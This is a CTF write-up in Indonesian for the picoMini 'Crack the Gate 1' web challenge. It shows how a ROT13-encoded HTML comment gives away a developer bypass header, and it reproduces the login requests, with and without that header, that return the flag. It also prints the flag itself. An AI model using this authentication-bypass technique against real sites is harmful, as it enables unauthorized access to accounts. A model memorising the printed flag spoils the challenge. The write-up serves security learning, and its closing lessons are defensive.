# Crack the Gate 1

| Informasi | Detail |
| --- | --- |
| Platform / Event | picoMini by CMU-Africa |
| Kategori | Web Exploitation |
| Tingkat Kesulitan | Easy |
| Status | Solved |

## Deskripsi

Challenge ini menyediakan portal web terbatas yang menyimpan data sensitif. Target
investigasi menggunakan alamat email `ctf-player@picoctf.org` untuk login, tetapi
password-nya tidak diketahui dan percobaan menebak password biasa tidak berhasil.

Petunjuk challenge mengarahkan untuk mencari catatan yang ditinggalkan developer dan
mencoba ROT13, yaitu rotasi setiap huruf sebanyak 13 posisi dalam alfabet.

## Informasi Awal

Instance yang terlihat pada screenshot dapat diakses melalui:

```text
http://amiable-citadel.picoctf.net:53962
```

Halaman awal menampilkan form login dengan field:

- `Email`: `ctf-player@picoctf.org`
- `Password`

Hint yang tersedia:

1. Developer terkadang meninggalkan catatan di dalam code, tetapi tidak selalu dalam
   bentuk plain text.
2. ROT13 dapat digunakan dengan merotasi setiap huruf sebanyak 13 posisi.

## Tools

- Firefox
- Firefox Developer Tools, panel `Inspector`
- Burp Suite Community Edition, fitur `Proxy` dan `Repeater`

## Analisis

Source HTML halaman login memuat komentar yang telah dienkripsi menggunakan ROT13:

```html
<!-- ABGR Wnpx - grzcbenel olcnff hfr "K-Qri-Nppnff: lrf" -->
```

Setelah didekode, komentar tersebut berbunyi:

```text
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
```

Catatan ini menunjukkan bahwa aplikasi memiliki mekanisme bypass sementara melalui
custom HTTP header `X-Dev-Access`.

Percobaan login tanpa header tersebut menghasilkan status `401 Unauthorized`, sehingga
password `admin123` saja tidak cukup untuk memperoleh akses.

## Langkah Penyelesaian

### 1. Membuka halaman login

Instance dibuka melalui browser. Form login menyediakan input email dan password pada
host berikut:

```text
amiable-citadel.picoctf.net:53962
```

Alamat email yang diberikan challenge adalah `ctf-player@picoctf.org`.

### 2. Memeriksa source HTML

Firefox Developer Tools dibuka pada panel `Inspector`. Di dalam source HTML terdapat
komentar berikut:

```html
<!-- ABGR Wnpx - grzcbenel olcnff hfr "K-Qri-Nppnff: lrf" -->
```

### 3. Mendekode komentar dengan ROT13

Petunjuk kedua menyebutkan rotasi 13 posisi. Setelah menerapkan ROT13, hasilnya adalah:

```text
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
```

Header yang perlu ditambahkan ke request adalah:

```http
X-Dev-Access: yes
```

### 4. Menguji login tanpa header bypass

Riwayat request pada Burp Suite menunjukkan request `POST /login` dengan body JSON
berikut:

```json
{
  "email": "ctf-player@picoctf.org",
  "password": "admin123"
}
```

Request tersebut tidak menyertakan header `X-Dev-Access` dan menghasilkan respons:

```http
HTTP/1.1 401 Unauthorized
```

```json
{
  "success": false,
  "error": "Unauthorized access."
}
```

Hasil ini menunjukkan bahwa password yang digunakan belum cukup tanpa header bypass.

### 5. Menambahkan header pada Burp Repeater

Request login dikirim ke Burp Repeater. Header `X-Dev-Access: yes` ditambahkan, sementara
body JSON tetap menggunakan email dan password yang sama:

```http
POST /login HTTP/1.1
Host: amiable-citadel.picoctf.net:53962
Content-Type: application/json
X-Dev-Access: yes
```

```json
{
  "email": "ctf-player@picoctf.org",
  "password": "admin123"
}
```

### 6. Mendapatkan flag dari respons

Setelah request dikirim ulang dengan header tersebut, server mengembalikan status
`200 OK` dan respons JSON yang memuat data pengguna serta flag:

```json
{
  "success": true,
  "email": "ctf-player@picoctf.org",
  "firstName": "pico",
  "lastName": "player",
  "flag": "picoCTF{brut_4_forc4_7e5db33b}"
}
```

## Flag

```text
picoCTF{brut_4_forc4_7e5db33b}
```

## Pembelajaran

- Komentar HTML dapat membocorkan informasi internal yang seharusnya tidak tersedia bagi
  pengguna.
- ROT13 sering digunakan untuk menyamarkan teks sederhana, bukan sebagai enkripsi yang
  aman.
- Custom header yang dipercaya server tidak boleh digunakan sebagai satu-satunya
  kontrol autentikasi atau authorization.
- Burp Suite Repeater membantu membandingkan respons request sebelum dan sesudah header
  tertentu ditambahkan.
